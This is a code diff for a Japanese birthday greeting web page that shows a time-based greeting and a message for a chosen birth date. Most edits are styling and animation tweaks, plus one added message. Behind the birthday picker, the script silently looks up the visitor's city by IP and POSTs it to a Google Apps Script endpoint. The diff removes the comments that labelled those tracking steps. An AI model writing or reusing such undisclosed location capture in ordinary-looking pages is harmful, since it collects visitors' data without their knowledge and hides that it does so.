@@ -13,7 +13,6 @@ body {
   display: flex;
   justify-content: center;
   align-items: center;
-  flex-direction: column;
   font-family: 'Arial', sans-serif;
   color: white;
 
@@ -38,18 +37,10 @@ body {
 
 /* 挨拶 */
 #greeting {
+  position: absolute;
   font-size: 6vw;
-  margin-bottom: 20px;
   opacity: 0;
   transition: 1s;
-}
-
-.fade-in {
-  opacity: 1;
-}
-
-.fade-out {
-  opacity: 0;
 }
 
 /* カード */
@@ -64,13 +55,11 @@ body {
   box-shadow: 0 20px 40px rgba(0,0,0,0.25);
 
   opacity: 0;
-  transform: translateY(20px);
   transition: 1s;
 }
 
 .show {
   opacity: 1;
-  transform: translateY(0);
 }
 
 h1 {
@@ -102,12 +91,6 @@ button:hover {
 #message {
   margin-top: 20px;
   font-size: 4.5vw;
-  animation: fadeIn 1s;
-}
-
-@keyframes fadeIn {
-  from {opacity: 0;}
-  to {opacity: 1;}
 }
 
 @media (min-width: 768px) {
@@ -134,7 +117,7 @@ button:hover {
 </div>
 
 <script>
-// 🔥 挨拶ロジック
+// 🔥 挨拶ロジック（修正）
 const greetingEl = document.getElementById("greeting");
 const hour = new Date().getHours();
 
@@ -152,14 +135,12 @@ greetingEl.innerText = greeting;
 
 // フェードイン
 setTimeout(() => {
-  greetingEl.classList.add("fade-in");
+  greetingEl.style.opacity = 1;
 }, 100);
 
 // フェードアウト → カード表示
 setTimeout(() => {
-  greetingEl.classList.remove("fade-in");
-  greetingEl.classList.add("fade-out");
-
+  greetingEl.style.opacity = 0;
   document.getElementById("card").classList.add("show");
 }, 2500);
 
@@ -180,7 +161,7 @@ for (let i = 1; i <= 31; i++) {
 }
 
 
-// 🔥 メイン処理（ログ含めそのまま維持）
+// 🔥 メイン処理（ログそのまま）
 function showMessage() {
   const m = monthSelect.value;
   const d = daySelect.value;
@@ -194,6 +175,7 @@ function showMessage() {
 
   const messages = {
     "1-1": "最高のスタートの日✨",
+    "4-13": "いつも一緒にいてくれてありがとう",
     "12-7": "あ！うそつきだ！",
     "2-14": "愛にあふれてる日💖",
     "7-7": "ロマンチックな日🌟",
@@ -203,13 +185,11 @@ function showMessage() {
   document.getElementById("message").innerText =
     messages[key] || "あなたの誕生日は特別な日✨";
 
-  // 🔥 ① 位置取得
   fetch("https://ipapi.co/json/")
     .then(res => res.json())
     .then(data => {
       const location = data.city || "unknown";
 
-      // 🔥 ② GAS送信
       fetch("https://script.google.com/macros/s/AKfycbwdllHoaEMtAClNC1kafLPypg1vNUsQ0yNO3faB7Ljv23KM8Y_s2pLzLdVAvdVHWVniMw/exec", {
         method: "POST",
         mode: "no-cors",
